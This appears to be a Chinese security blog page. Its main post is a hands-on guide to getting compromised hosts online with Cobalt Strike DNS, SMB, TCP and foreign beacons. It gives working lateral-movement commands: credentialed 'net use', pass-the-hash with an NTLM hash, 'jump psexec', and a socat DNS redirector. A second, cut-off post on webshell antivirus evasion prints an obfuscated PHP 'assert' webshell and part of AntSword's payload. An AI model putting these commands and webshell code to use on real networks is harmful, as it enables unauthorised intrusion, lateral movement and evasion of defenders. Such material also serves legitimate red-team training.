<h3 id="DNS-beacon"><a href="#DNS-beacon" class="headerlink" title="DNS beacon"></a>DNS beacon</h3><p>​        在一些隔离比较好的网络里，一般http或者https协议可能是不出网的，但是DNS协议是出网的，因此可以使用DNS协议来帮助我们来传输数据。</p>
<h4 id="配置DNS-解析"><a href="#配置DNS-解析" class="headerlink" title="配置DNS 解析"></a>配置DNS 解析</h4><p>​        首先我们需要在DNS上设置一个A记录,将我们申请的一个域名的子域名指向我们的teamserver服务器的ip地址。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904101728925.png" alt="image-20200904101728925"></p>
<p>​        之后需要添加一个NS记录，记录名可以写上dns，记录值写入test666.xxx.com</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904102228588.png" alt="image-20200904102228588"></p>
<p>​        设置好以后，当我们去请求xxx.dns.xxx.com时，首先dns首先会解析到xxx.com，再发现dns.xxx.com是test666.xxx.com来解析，然后就可以找到test666.xxx.com对应的ip地址来进行通信。</p>
<p>​        然后我们在cobaltstrkie中开启一个dns listener,这里DNS Hosts和DNS Host(stager)都需要配置为dns.xxx.com</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904104939022.png" alt="image-20200904104939022"></p>
<p>​        开启监听后，我们再使用nslookup进行测试,但是我们看到这个地址是8.8.8.8，这个是因为我们在profile文件中配置的问题，可以在文件中的dns_idle这个参数进行配置，cobaltstrike会通过返回这个地址告诉客户端没有安排任务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup dns.xxx.com test666.xxx.com</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904105137130.png" alt="image-20200904105137130"></p>
<p>​        配置好以后我们首先生成一个executable的shell，这种shell有个特点，之前的文章中我们分析过，就是他会分阶段请求，因此生成的文件stager文件比较小，实际在执行阶段会去下载相对来说比较大的stage文件，我们将生成的shell执行后抓包，可以看到客户端向我们的域名发起解析大量的解析请求。而且在等待了一小段时间后发现还是没有上线，因为要下载的stage文件比较大，大概200多k左右，使用dns解析去获取这个文件会非常慢，这也是为什么很多人测试dns上线以为失败了的原因。<img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904110829625.png" alt="image-20200904110829625"></p>
<p>​        因此，我们在使用DNS上线cobaltstrike的时候就不要使用分阶段执行的方式了，直接生成一个stageless的shell就好了。当使用stageless的shell后，执行后发起的请求非常少，并且也可以马上上线。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904111354460.png" alt="image-20200904111354460"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904111427752.png" alt="image-20200904111427752"></p>
<p>​        可以看到上线以后是一个黑框，这个就是DNS beacon上线后的样子，这个时候如果我们去执行命令会执行失败，这个时候我们需要使用一个checkin命令，让dns beacon回连我们的teamserver，理论上讲设置了checkin以后就会和我们其他隧道上线后的样子一样，但我设置以后还是还是迟迟没有上线，这里是因为数据传输过慢而导致的，我们可以再执行mode dns-txt来加快数据传输的速度，当我们执行完这个命令后再看下数据包</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904112605904.png" alt="image-20200904112605904"></p>
<p>​        可以看到数据传输加快了，并且我们可以命令也可以正常执行。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904112632294.png" alt="image-20200904112632294"></p>
<p>​        这里对DNS beacon做一个小小的总结，首先，生成的shell注意要生成stagless的shell，否则会迟迟上不了线。还有就是上线后需要去执行checkin和mode dns-txt命令，否则基本也执行不了命令。</p>
<p>​        最后其实关于dns beacon的配置也可以再profile文件中进行配置。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904113553210.png" alt="image-20200904113553210"></p>
<h4 id="DNS-beacon-配合重定向上线"><a href="#DNS-beacon-配合重定向上线" class="headerlink" title="DNS beacon 配合重定向上线"></a>DNS beacon 配合重定向上线</h4><p>​        首先我们还是再DNS上进行一些配置，不过这次配置，解析的地址设置的不是我们的teamserver的地址，而是做重定向的那台主机的ip地址。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904114435877.png" alt="image-20200904114435877"></p>
<p>​        然后我们用nslookup来进行检查，看是否能正常解析到我们的的重定向主机</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904115655015.png" alt="image-20200904115655015"></p>
<p>​        测试正常以后，我们再重定向主机上用socat做一个转发，将来自53的流量转发到我们teamserver的53，这里需要注意的是转发需要设置udp而不是ftp。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat UDP4-LISTEN:53,fork UDP:XXX.XXX.XXX.XXX:53</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904133845024.png" alt="image-20200904133845024"></p>
<p>​        使用cobaltstrike创建一个dns listener,配置和之前一样</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904133934172.png" alt="image-20200904133934172"></p>
<p>​        配置好以后，我们生成一个stageless的shell，执行后即可上线</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904134414570.png" alt="image-20200904134414570"></p>
<h3 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB beacon"></a>SMB beacon</h3><p>​        在内网横向渗透时，经常会遇到内网主机无法和我们搭建在外网的teamserver进行通信，这时，可以使用smb beacon来上线内网的断网主机。</p>
<p>​        首先创建一个smb listener，因为我们在使用smb beacon时实际是使用了命名管道的技术，所以还要去设置管道名，在下方对应的ntsvcs</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904134955291.png" alt="image-20200904134955291"></p>
<p>​        配置好以后，假如我们现在已经知道了某个内网主机的密码,但是这台内网主机无法通外网，就可以借助smb beacon来上线内网主机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.73\admin$ &#x2F;user:&quot;dbadmin&quot; &quot;xxxxx&quot;    &#x2F;&#x2F;首先和内网主机建立ipc连接</span><br><span class="line">jump psexec 192.168.3.73 test666  &#x2F;&#x2F;test666为smb listener的名字</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140424681.png" alt="image-20200904140424681"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140435915.png" alt="image-20200904140435915"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140450106.png" alt="image-20200904140450106"></p>
<p>​        我们在上线的断网机上执行命令，抓包可以看到是边界主机和内网断网主机通过ntsvcs这个命令smb命名管道进行通信的。还要说明的是上线的内网主机默认心跳会一直增加，这个不用管，需要使用的时候去执行就行了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904140731323.png" alt="image-20200904140731323"></p>
<p>​        同样我们也可以在GUI界面上使用pth来上线断网机，</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904142513359.png" alt="image-20200904142513359"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904142457361.png" alt="image-20200904142457361"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143038298.png" alt="image-20200904143038298"></p>
<p>​        psexec设置的时候，listener设置我们建立的smb beacon的listener。执行结果如下</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143131436.png" alt="image-20200904143131436"></p>
<p>​         通过上面的执行过程我们可以看到，cobaltstrike首先伪造了令牌，再通过伪造的令牌执行smb beacon。所以上面那个过程我们完全可以通过命令来执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br><span class="line">pth .\administrator ae4c0d5fb959fda8f4cb1d14a8376af4</span><br><span class="line">shell dir \\192.168.3.73\c$</span><br><span class="line">jump psexec 192.168.3.73 test666</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143524423.png" alt="image-20200904143524423"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143530695.png" alt="image-20200904143530695"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904143624650.png" alt="image-20200904143624650"></p>
<p>​        smb beacon在运行过程中不是和我们的teamserver服务端直接通信的，而是和它的父beacon进行通信，再把结果显示出来，因此我们不能直接生成stage或者stageless的exe去执行，因为执行后找不到父进程。</p>
<h3 id="TCP-beacon"><a href="#TCP-beacon" class="headerlink" title="TCP beacon"></a>TCP beacon</h3><h4 id="bind-tcp-beacon"><a href="#bind-tcp-beacon" class="headerlink" title="bind tcp beacon"></a>bind tcp beacon</h4><p>​        tcp beacon和smb beacon类似，也是在内网中使用的，原理也是利用了边界主机作一个中转，它会再内网主机上开启4444端口，我们通过这个端口来接收内网机器的流量。先来看看如何使用</p>
<p>​        首先建立一个TCP listener</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904145041421.png" alt="image-20200904145041421"></p>
<p>​        建立好以后，再和内网主机建立ipc连接，使用jump命令上线内网断网主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 test666  &#x2F;&#x2F;&#x2F;test666为tcp listener的名字</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904145254580.png" alt="image-20200904145254580"></p>
<p>​        上线后我们使用wireshark看一看流量，我们可以看到内网主机是通过开放4444端口，通过边界机的某个端口和内网的主机通过TCP进行通信，最后再由边界机将流量发送给我们的服务端。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152346964.png" alt="image-20200904152346964"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152004125.png" alt="image-20200904152004125"></p>
<p>​        当我们再内网主机上执行命令，可以看到命令是再边界机上和teamserver通信进行传输的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152253205.png" alt="image-20200904152253205"></p>
<p>​        从下面的图也可以看出连接的关系，边界机和teamserver之间是反向连接的，而边界机和内网主机是正向连接的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152525518.png" alt="image-20200904152525518"></p>
<p>​        下面是断开和连接内网主机的命令,注意看这里连接不是使用link，而是使用connect</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink 192.168.3.73</span><br><span class="line">connect 192.168.3.73</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904152724658.png" alt="image-20200904152724658"></p>
<p>​        对于tcp bind beacon这种形式，我们也可以生成一个stageless的exe，在内网主机上执行，需要注意的是执行后不会直接上线，而是在内网主机上开放一个端口，我们在边界机上使用connect命令去连接目标即可。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904153621521.png" alt="image-20200904153621521"></p>
<p>​        listener这里设置我们的tcp listener的名字</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904153637610.png" alt="image-20200904153637610"></p>
<p>​        生成的shell在目标主机执行后，查看端口会开启4444端口的监听</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154100177.png" alt="image-20200904154100177"></p>
<p>​        我们再使用边界机去连接，即可上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.3.73</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154344617.png" alt="image-20200904154344617"></p>
<h4 id="revserse-tcp-beacon"><a href="#revserse-tcp-beacon" class="headerlink" title="revserse tcp beacon"></a>revserse tcp beacon</h4><p>​        上面演示了关于bind tcp beacon的用法，实际上我们使用reverse tcp beacon来上线断网主机。</p>
<p>​        首先再边界机上创建一个reverse  tcp listener</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154603243.png" alt="image-20200904154603243"></p>
<p>​        设置的时候需要注意host要写边界机对应的内网的网段，我的测试中192.168.3网段使用的仅主机模式，边界机对应的仅主机模式的地址是192.168.3.144</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154713600.png" alt="image-20200904154713600"></p>
<p>​        生成好以后，我们同样先和内网断网机建立ipc连接，建立后使用jump命令来上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec 192.168.3.73 test123123  &#x2F;&#x2F;test123123是刚建立的反向tcp listener的名字</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904154910274.png" alt="image-20200904154910274"></p>
<p>​        我们在断网机上看看，使用这种模式会在边界主机开放一个4444端口，断网机和目标的4444端口来进行通信</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904155149201.png" alt="image-20200904155149201"></p>
<p>​        从cobaltstrike上也能看到使用的内网主机反向连接了边界主机</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904155317538.png" alt="image-20200904155317538"></p>
<p>​        当然也可以生成stageless的exe来上线，生成的exe在内网主机执行后会直接上线，不用我们主动去连接它。</p>
<h3 id="foreign-beaon"><a href="#foreign-beaon" class="headerlink" title="foreign beaon"></a>foreign beaon</h3><p>​        有时候我们会有这样的需求，就是将我们获得的beacon派生给其他的服务端做稳控，或者派生给msf，这就需要使用foreign beaon。</p>
<p>​        首先我们在另一个CobaltStrike上开启一个HTTP Listener</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904163933413.png" alt="image-20200904163933413"></p>
<p>​    再回到派生的那台cobaltstrike，这台cobaltstrike上已经有了一个上线的主机。我们给这个cobaltstrike上创建一个foreign beacon。地址选择我们刚刚创建http listener的那台主机</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164121861.png" alt="image-20200904164121861"></p>
<p>​    创建好以后，在需要派生的beacon上选择Spawn</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164255379.png" alt="image-20200904164255379"></p>
<p>​        在弹出的框中选择我们创建的foreign listener</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904164320540.png" alt="image-20200904164320540"></p>
<p>​        确定后可以看到另一个cobaltstrike上线了，并且可以看到是使用rundll32的方式执行的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8ECobaltStrike%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AEbeacon%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/image-20200904165109471.png" alt="image-20200904165109471"></p>
<p>​        关于派生给msf的方法类似，就不讲了。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        最后我们来总结一下，在cobaltstrike中提供了很多beacon上线的方式，其中http/https/比较适合上线边界主机，当然在网络环境比较差的情况下也可以使用DNS来上线，不过DNS beacon执行命令还可以，但是要上传和下载文件速度会非常慢。在内网横向渗透的时候可以使用SMB beacon和TCP beacon，需要将beacon派生给其他的C2可以使用foreign beaon。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://shimo.im/docs/3RjkWKcQxkrPwxyd/read" target="_blank" rel="noopener">关于合法证书+ps上线手把手示范</a></p>
<p><a href="https://xz.aliyun.com/t/7488" target="_blank" rel="noopener">cobaltstrike dns beacon知多少</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于蚁剑免杀的学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-02 19:58:25" itemprop="dateCreated datePublished" datetime="2020-09-02T19:58:25+08:00">2020-09-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-28 18:38:42" itemprop="dateModified" datetime="2020-07-28T18:38:42+08:00">2020-07-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当我们直接使用蚁剑这种比较出名的shell管理工具，在一些防护比较严的情况下，可能过一会会就被发现甚至关站，因此去除蚁剑的特征或者对shell免杀都是特别重要的，我之前并未接触过这方面的知识，写这篇文章的目的就是记录自己学习的一个过程，所以开始吧。</span><br></pre></td></tr></table></figure>

<p>我认为特征处理有几个部分吧，一个是静态代码特征，比如我们直接使用蚁剑的马，这种马如果我们没有进行过任何处理直接上传就非常有可能在上传的时候被干掉，也就是说如果在上传的时候就被干掉了，或者上传之后被干掉了，问题都出在传的马被杀了。还有一种情况就是我们的马传上去了，而且也能访问到，然后使用蚁剑连接的时候发现连接被阻断同时马被杀了，这个就是流量方面的特征的问题了。</p>
<h3 id="自带shell分析"><a href="#自带shell分析" class="headerlink" title="自带shell分析"></a>自带shell分析</h3><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>这里首先以php为例，因为其语法变化最为灵活，也是相对来说比较容易做处理的，首先我们看下自带的马是什么样子的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant&#x3D;base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">$ant($_POST[&#39;ant&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这个代码非常容易理解，就是将assert关键字进行base64编码，但是我使用assert这个shell会有一个问题，就是蚁剑连不上，通过抓包分析， 在蚁剑连接的时候会发送一个数据包。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727103950002.png" alt="image-20200727103950002"></p>
<p>因为发送这个数据后返回为空，所以蚁剑显示连接不上，但是我这里将这串数据改成phpinfo()也是可以正常执行的，也就是说这里并不是因为assert不能正常执行命令的问题。我们将这串代码解码后看看,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line"></span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">    return $out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function asoutput() &#123;</span><br><span class="line">    $output &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo &quot;97a7a&quot;;</span><br><span class="line">    echo @asenc($output);</span><br><span class="line">    echo &quot;777a7fdcd7c&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">    $D &#x3D; dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    if ($D &#x3D;&#x3D; &quot;&quot;) $D &#x3D; 